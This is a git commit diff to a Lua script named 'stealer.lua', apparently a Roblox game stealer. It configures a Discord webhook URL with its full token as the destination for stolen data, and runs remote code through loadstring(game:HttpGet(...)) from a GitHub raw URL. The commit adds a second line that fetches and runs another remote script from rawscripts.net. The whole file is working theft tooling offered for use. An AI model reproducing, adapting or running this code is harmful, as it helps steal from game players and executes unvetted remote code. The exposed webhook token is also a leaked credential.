2ef3545e2ae324d4060a2023e1e25a8725ffbc0f
Cupid-01 <maramarajadematthew@gmail.com>
2026-01-18 18:04:59 +0800

    Update stealer.lua

--- stealer.lua
+++ stealer.lua
@@ -4,3 +4,5 @@ _G.pingEveryone = "Yes" -- change to "No" if you dont want pings
 _G.webhook = "https://discord.com/api/webhooks/1462380513061769318/ZXgIgeG6PQmEGi1DzU7MC-yZAXegtbbAAw59J5HBCUXfB_0B9m3gI0CX4jHypVuL0NDW" -- change to your webhook
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Cupid-01/BBall/refs/heads/main/source.lua"))()
+
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Argon-Hub-X-Blade-Ball-OP-48528"))()
